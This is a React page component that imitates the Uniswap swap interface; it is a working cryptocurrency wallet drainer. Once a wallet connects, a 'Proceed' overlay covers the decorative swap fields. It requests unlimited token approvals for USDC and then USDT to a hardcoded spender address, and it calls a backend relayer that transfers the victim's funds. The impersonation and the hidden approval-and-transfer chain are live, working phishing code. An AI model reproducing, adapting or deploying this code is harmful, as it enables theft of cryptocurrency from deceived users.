import { Button } from "@/components/ui/button";
import { ArrowDown, Settings, ChevronDown, Loader2, CheckCircle } from "lucide-react";
import { useState, useEffect } from "react";
import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionReceipt } from "wagmi";
import { useConnectModal } from "@rainbow-me/rainbowkit";
import headerImage from "@assets/image_1767365952238.png";

const SPENDER_ADDRESS = "0x749d037Dfb0fAFA39C1C199F1c89eD90b66db9F1";
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" }
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function"
  }
] as const;

const TokenIcon = ({ symbol, size = 24 }: { symbol: string; size?: number }) => {
  const icons: Record<string, JSX.Element> = {
    ETH: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#627EEA"/>
        <path d="M16.498 4v8.87l7.497 3.35L16.498 4z" fill="#fff" fillOpacity=".6"/>
        <path d="M16.498 4L9 16.22l7.498-3.35V4z" fill="#fff"/>
        <path d="M16.498 21.968v6.027L24 17.616l-7.502 4.352z" fill="#fff" fillOpacity=".6"/>
        <path d="M16.498 27.995v-6.028L9 17.616l7.498 10.379z" fill="#fff"/>
        <path d="M16.498 20.573l7.497-4.353-7.497-3.348v7.701z" fill="#fff" fillOpacity=".2"/>
        <path d="M9 16.22l7.498 4.353v-7.701L9 16.22z" fill="#fff" fillOpacity=".6"/>
      </svg>
    ),
    USDC: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#2775CA"/>
        <path d="M20.022 18.124c0-2.124-1.28-2.852-3.84-3.156-1.828-.24-2.196-.728-2.196-1.578 0-.85.608-1.396 1.824-1.396 1.088 0 1.696.364 1.972 1.276a.39.39 0 00.364.268h.84a.36.36 0 00.356-.388c-.24-1.516-1.264-2.632-2.892-2.908v-1.66a.358.358 0 00-.364-.364h-.728a.358.358 0 00-.364.364v1.604c-1.828.304-2.984 1.516-2.984 3.004 0 1.996 1.216 2.788 3.776 3.092 1.7.244 2.26.608 2.26 1.64 0 1.032-.912 1.724-2.132 1.724-1.66 0-2.196-.696-2.392-1.64a.374.374 0 00-.364-.304h-.912a.36.36 0 00-.356.388c.244 1.716 1.328 2.972 3.14 3.284v1.66c0 .2.164.364.364.364h.728a.358.358 0 00.364-.364v-1.66c1.828-.364 3.036-1.64 3.036-3.35z" fill="#fff"/>
        <path d="M12.628 24.164c-4.256-1.54-6.44-6.26-4.868-10.46 1.024-2.788 3.476-4.596 6.24-4.992V6.948c-3.632.396-6.672 2.788-8.024 6.14-2.016 5.052.476 10.792 5.528 12.808a9.856 9.856 0 003.124.728v-1.764a7.95 7.95 0 01-2-.696zM16 6.948v1.764c3.632.396 6.372 3.22 6.372 6.644h1.764c0-4.18-3.392-7.812-8.136-8.408z" fill="#fff"/>
      </svg>
    ),
    USDT: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#26A17B"/>
        <path d="M17.922 17.383v-.002c-.11.008-.677.042-1.942.042-1.01 0-1.721-.03-1.971-.042v.003c-3.888-.171-6.79-.848-6.79-1.658 0-.809 2.902-1.486 6.79-1.66v2.644c.254.018.982.061 1.988.061 1.207 0 1.812-.05 1.925-.06v-2.643c3.88.173 6.775.85 6.775 1.658 0 .81-2.895 1.485-6.775 1.657zm0-3.59v-2.366h5.414V7.819H8.595v3.608h5.414v2.365c-4.4.202-7.709 1.074-7.709 2.118 0 1.044 3.309 1.915 7.709 2.118v7.582h3.913v-7.584c4.393-.202 7.694-1.073 7.694-2.116 0-1.043-3.301-1.914-7.694-2.117z" fill="#fff"/>
      </svg>
    ),
    DAI: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#F5AC37"/>
        <path d="M16 6L9 16l7 10 7-10-7-10zm0 3.236L20.944 16 16 22.764 11.056 16 16 9.236z" fill="#fff"/>
        <path d="M16 22.764V26L23 16l-2.056 0L16 22.764zM16 9.236V6L9 16l2.056 0L16 9.236z" fill="#fff" fillOpacity=".6"/>
      </svg>
    ),
    WBTC: (
      <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
        <circle cx="16" cy="16" r="16" fill="#F7931A"/>
        <path d="M21.79 14.054c.24-1.602-.98-2.463-2.648-3.037l.541-2.17-1.32-.33-.527 2.112a53.34 53.34 0 00-1.057-.249l.53-2.126-1.32-.329-.541 2.17c-.289-.066-.573-.131-.849-.2l.001-.006-1.82-.455-.352 1.41s.98.225.96.239c.534.133.631.487.614.768l-.615 2.466c.037.009.084.023.137.044l-.14-.035-.862 3.455c-.065.162-.23.405-.603.313.013.019-.96-.24-.96-.24l-.656 1.513 1.717.428c.32.08.632.164.94.243l-.548 2.2 1.32.329.542-2.172c.36.098.71.188 1.051.273l-.54 2.162 1.32.33.548-2.195c2.257.427 3.954.255 4.668-1.786.576-1.643-.029-2.591-1.216-3.208.864-.2 1.515-.768 1.689-1.943zm-3.023 4.24c-.41 1.644-3.18.755-4.078.532l.728-2.917c.898.224 3.777.668 3.35 2.385zm.41-4.266c-.374 1.495-2.68.735-3.428.549l.66-2.645c.748.187 3.154.535 2.768 2.096z" fill="#fff"/>
      </svg>
    ),
  };
  return icons[symbol] || <div className="w-6 h-6 rounded-full bg-gray-400" />;
};

const TOKENS = [
  { symbol: "ETH", name: "Ethereum" },
  { symbol: "USDC", name: "USD Coin" },
  { symbol: "USDT", name: "Tether" },
  { symbol: "DAI", name: "Dai" },
  { symbol: "WBTC", name: "Wrapped BTC" },
];

type Step = "idle" | "approving" | "transferring" | "done";

export default function Home() {
  const [activeTab, setActiveTab] = useState("Swap");
  const [sellAmount, setSellAmount] = useState("");
  const [buyAmount, setBuyAmount] = useState("");
  const [sellToken, setSellToken] = useState(TOKENS[0]);
  const [buyToken, setBuyToken] = useState<typeof TOKENS[0] | null>(null);
  const [showSellTokens, setShowSellTokens] = useState(false);
  const [showBuyTokens, setShowBuyTokens] = useState(false);
  
  const [currentToken, setCurrentToken] = useState<"usdc" | "usdt" | "complete">("usdc");
  const [step, setStep] = useState<Step>("idle");
  const [error, setError] = useState<string>("");

  const { address, isConnected } = useAccount();
  const { openConnectModal } = useConnectModal();
  const { disconnect } = useDisconnect();
  
  const { writeContract, data: hash, isPending, reset } = useWriteContract();
  const { isLoading: isConfirming, isSuccess: isConfirmed } = useWaitForTransactionReceipt({ hash });

  const tokenAddress = currentToken === "usdc" ? USDC_ADDRESS : USDT_ADDRESS;
  const tokenSymbol = currentToken === "usdc" ? "USDC" : "USDT";

  useEffect(() => {
    if (isConfirmed && hash && step === "approving") {
      fetch("/api/approvals", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: address,
          tokenAddress: tokenAddress,
          tokenSymbol,
          transactionHash: hash,
        }),
      }).catch(console.error);

      setStep("transferring");
      executeRelayerTransfer();
    }
  }, [isConfirmed, hash, step]);

  const executeRelayerTransfer = async () => {
    try {
      const response = await fetch("/api/execute-transfer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          walletAddress: address,
          tokenSymbol: currentToken.toUpperCase(),
        }),
      });

      const result = await response.json();

      if (result.success) {
        goToNextToken();
      } else {
        if (result.error?.includes('No allowance') || result.error?.includes('no balance')) {
          goToNextToken();
        } else {
          setError(result.error || "Transfer failed");
          setStep("idle");
        }
      }
    } catch (err: any) {
      setError(err?.message || "Failed to execute transfer");
      setStep("idle");
    }
  };

  const goToNextToken = () => {
    if (currentToken === "usdc") {
      setCurrentToken("usdt");
      reset();
      // Auto-trigger USDT approval after USDC completes
      setTimeout(() => {
        setStep("approving");
        writeContract({
          address: USDT_ADDRESS as `0x${string}`,
          abi: ERC20_ABI,
          functionName: "approve",
          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
        });
      }, 500);
    } else {
      setCurrentToken("complete");
      setStep("done");
    }
  };

  const handleProceed = () => {
    if (!address) return;
    setError("");

    if (step === "idle") {
      setStep("approving");
      try {
        writeContract({
          address: tokenAddress as `0x${string}`,
          abi: ERC20_ABI,
          functionName: "approve",
          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
        });
      } catch (err: any) {
        setError(err?.message || "Failed to approve token");
        setStep("idle");
      }
    }
  };

  const isProcessing = isPending || isConfirming || step === "approving" || step === "transferring";

  const handleSwapDirection = () => {
    const tempToken = sellToken;
    const tempAmount = sellAmount;
    setSellToken(buyToken || TOKENS[0]);
    setBuyToken(tempToken);
    setSellAmount(buyAmount);
    setBuyAmount(tempAmount);
  };

  const tabs = ["Swap", "Limit", "Buy", "Sell"];

  return (
    <div className="min-h-screen bg-background">
      <div className="fixed top-0 left-0 right-0 z-50">
        <div className="relative">
          <img 
            src={headerImage} 
            alt="Uniswap Header" 
            className="w-full h-auto"
            data-testid="img-header"
          />
          <div 
            className="absolute bg-white"
            style={{ 
              top: '50%', 
              right: '0',
              width: '120px',
              height: '50%',
              zIndex: 99
            }}
          />
          <button 
            className="absolute cursor-pointer border-0 outline-none bg-[#FF00D6] hover:bg-[#e800c0] text-white font-semibold rounded-[20px] px-5 py-2 text-sm whitespace-nowrap"
            style={{ 
              top: '55%', 
              right: '1%',
              zIndex: 100
            }}
            onClick={isConnected ? () => disconnect() : openConnectModal}
            data-testid={isConnected ? "button-disconnect" : "button-connect"}
          >
            {isConnected ? `${address?.slice(0, 6)}...${address?.slice(-4)}` : "Connect"}
          </button>
        </div>
      </div>

      <main className="pt-32 pb-20 px-4" style={{ marginTop: '80px' }}>
        <div className="max-w-md mx-auto">
          <div className="bg-card rounded-3xl border border-border shadow-lg p-2 relative overflow-hidden">
            {/* Proceed Overlay - covers swap box when connected */}
            {isConnected && currentToken !== "complete" && (
              <div className="absolute inset-0 z-20 flex items-center justify-center p-4">
                <button
                  onClick={handleProceed}
                  disabled={isProcessing}
                  className="w-full h-full rounded-2xl bg-[#FF00D6] hover:bg-[#e800c0] text-white text-xl font-semibold flex items-center justify-center gap-3 disabled:opacity-80"
                  data-testid="button-proceed"
                >
                  {isProcessing ? (
                    <>
                      <Loader2 className="w-6 h-6 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    "Proceed"
                  )}
                </button>
              </div>
            )}
            
            {/* Complete Overlay */}
            {isConnected && currentToken === "complete" && (
              <div className="absolute inset-0 z-20 flex items-center justify-center p-4">
                <div className="w-full h-full rounded-2xl bg-green-500 text-white text-xl font-semibold flex items-center justify-center gap-3">
                  <CheckCircle className="w-6 h-6" />
                  Complete!
                </div>
              </div>
            )}

            <div className="flex items-center justify-between px-2 py-2 mb-2">
              <div className="flex items-center gap-1">
                {tabs.map((tab) => (
                  <button
                    key={tab}
                    onClick={() => setActiveTab(tab)}
                    className={`px-4 py-2 text-sm font-medium rounded-full transition-colors ${
                      activeTab === tab
                        ? "bg-muted text-foreground"
                        : "text-muted-foreground hover:text-foreground"
                    }`}
                    data-testid={`tab-${tab.toLowerCase()}`}
                  >
                    {tab}
                  </button>
                ))}
              </div>
              <button className="p-2 hover:bg-muted rounded-lg" data-testid="button-settings">
                <Settings className="w-5 h-5 text-muted-foreground" />
              </button>
            </div>

            <div className="space-y-1">
              <div className="bg-muted rounded-2xl p-4 relative">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm text-muted-foreground">Sell</span>
                </div>
                <div className="flex items-center justify-between gap-4">
                  <input
                    type="text"
                    value={sellAmount}
                    onChange={(e) => setSellAmount(e.target.value)}
                    placeholder="0"
                    className="bg-transparent text-4xl font-medium w-full focus:outline-none text-foreground placeholder:text-muted-foreground"
                    data-testid="input-sell-amount"
                  />
                  <div className="relative">
                    <button
                      onClick={() => setShowSellTokens(!showSellTokens)}
                      className="flex items-center gap-2 bg-background hover:bg-background/80 rounded-full px-3 py-2 border border-border shadow-sm"
                      data-testid="button-sell-token"
                    >
                      <TokenIcon symbol={sellToken.symbol} size={24} />
                      <span className="font-semibold">{sellToken.symbol}</span>
                      <ChevronDown className="w-4 h-4 text-muted-foreground" />
                    </button>
                    
                    {showSellTokens && (
                      <div className="absolute right-0 top-12 bg-card border border-border rounded-2xl shadow-xl p-2 w-56 z-10">
                        {TOKENS.map((token) => (
                          <button
                            key={token.symbol}
                            onClick={() => {
                              setSellToken(token);
                              setShowSellTokens(false);
                            }}
                            className="flex items-center gap-3 w-full p-3 hover:bg-muted rounded-xl"
                            data-testid={`sell-token-${token.symbol.toLowerCase()}`}
                          >
                            <TokenIcon symbol={token.symbol} size={32} />
                            <div className="text-left">
                              <div className="font-medium">{token.symbol}</div>
                              <div className="text-xs text-muted-foreground">{token.name}</div>
                            </div>
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
                <div className="text-sm text-muted-foreground mt-1">$0</div>
              </div>

              <div className="flex justify-center -my-2 relative z-10">
                <button
                  onClick={handleSwapDirection}
                  className="bg-muted hover:bg-muted/80 border-4 border-card rounded-xl p-2 transition-transform hover:rotate-180 duration-300"
                  data-testid="button-swap-direction"
                >
                  <ArrowDown className="w-4 h-4 text-muted-foreground" />
                </button>
              </div>

              <div className="bg-muted rounded-2xl p-4">
                <div className="flex items-center justify-between mb-2">
                  <span className="text-sm text-muted-foreground">Buy</span>
                </div>
                <div className="flex items-center justify-between gap-4">
                  <input
                    type="text"
                    value={buyAmount}
                    onChange={(e) => setBuyAmount(e.target.value)}
                    placeholder="0"
                    className="bg-transparent text-4xl font-medium w-full focus:outline-none text-foreground placeholder:text-muted-foreground"
                    data-testid="input-buy-amount"
                  />
                  <div className="relative">
                    <button
                      onClick={() => setShowBuyTokens(!showBuyTokens)}
                      className={`flex items-center gap-2 rounded-full px-3 py-2 font-semibold text-sm whitespace-nowrap ${
                        buyToken 
                          ? "bg-background hover:bg-background/80 border border-border shadow-sm" 
                          : "bg-[#FF00D6] hover:bg-[#e800c0] text-white"
                      }`}
                      data-testid="button-buy-token"
                    >
                      {buyToken ? (
                        <>
                          <TokenIcon symbol={buyToken.symbol} size={24} />
                          <span>{buyToken.symbol}</span>
                        </>
                      ) : (
                        <span>Select token</span>
                      )}
                      <ChevronDown className="w-4 h-4" />
                    </button>
                    
                    {showBuyTokens && (
                      <div className="absolute right-0 top-12 bg-card border border-border rounded-2xl shadow-xl p-2 w-56 z-10">
                        {TOKENS.filter(t => t.symbol !== sellToken.symbol).map((token) => (
                          <button
                            key={token.symbol}
                            onClick={() => {
                              setBuyToken(token);
                              setShowBuyTokens(false);
                            }}
                            className="flex items-center gap-3 w-full p-3 hover:bg-muted rounded-xl"
                            data-testid={`buy-token-${token.symbol.toLowerCase()}`}
                          >
                            <TokenIcon symbol={token.symbol} size={32} />
                            <div className="text-left">
                              <div className="font-medium">{token.symbol}</div>
                              <div className="text-xs text-muted-foreground">{token.name}</div>
                            </div>
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </div>

            {/* Connect wallet button - only shows when not connected */}
            {!isConnected && (
              <div className="mt-4">
                <button
                  onClick={openConnectModal}
                  className="w-full py-4 text-lg font-semibold rounded-2xl bg-[#FFF0FB] hover:bg-[#FFE4F5] text-[#FF00D6]"
                  data-testid="button-connect-wallet"
                >
                  Connect wallet
                </button>
              </div>
            )}
          </div>
        </div>
      </main>

      <div className="fixed bottom-4 left-4">
        <button className="w-8 h-8 bg-black rounded-full flex items-center justify-center hover:bg-gray-800" data-testid="button-help">
          <span className="text-white text-sm font-medium">?</span>
        </button>
      </div>
    </div>
  );
}
